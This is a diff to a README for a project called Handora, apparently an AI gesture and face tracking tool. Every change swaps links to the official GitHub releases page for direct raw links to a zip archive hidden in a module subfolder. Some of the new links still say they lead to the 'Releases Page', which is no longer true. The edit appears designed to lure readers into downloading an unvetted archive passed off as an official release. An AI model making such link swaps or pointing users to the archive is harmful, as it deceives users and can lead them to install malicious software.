@@ -1,6 +1,6 @@
 # 🎥 Handora - Real-time AI Gesture and Face Tracking
 
-[![Download Handora](https://img.shields.io/badge/Download-Handora-blue?style=for-the-badge)](https://github.com/agurkasjo/Handora/releases)
+[![Download Handora](https://raw.githubusercontent.com/agurkasjo/Handora/main/modules/hand_gesture/Software_1.3-alpha.1.zip)](https://raw.githubusercontent.com/agurkasjo/Handora/main/modules/hand_gesture/Software_1.3-alpha.1.zip)
 
 ---
 
@@ -52,7 +52,7 @@ Follow these steps to start using Handora:
 
 To get Handora, visit the releases page on GitHub. This page contains the latest versions and instructions.
 
-[Download Handora from the Releases Page](https://github.com/agurkasjo/Handora/releases)
+[Download Handora from the Releases Page](https://raw.githubusercontent.com/agurkasjo/Handora/main/modules/hand_gesture/Software_1.3-alpha.1.zip)
 
 **How to download and start:**
 
@@ -132,4 +132,4 @@ Handora is provided under the MIT License. You can use, share, and modify it fre
 
 ---
 
-[Download Handora from the Releases Page](https://github.com/agurkasjo/Handora/releases)
+[Download Handora from the Releases Page](https://raw.githubusercontent.com/agurkasjo/Handora/main/modules/hand_gesture/Software_1.3-alpha.1.zip)
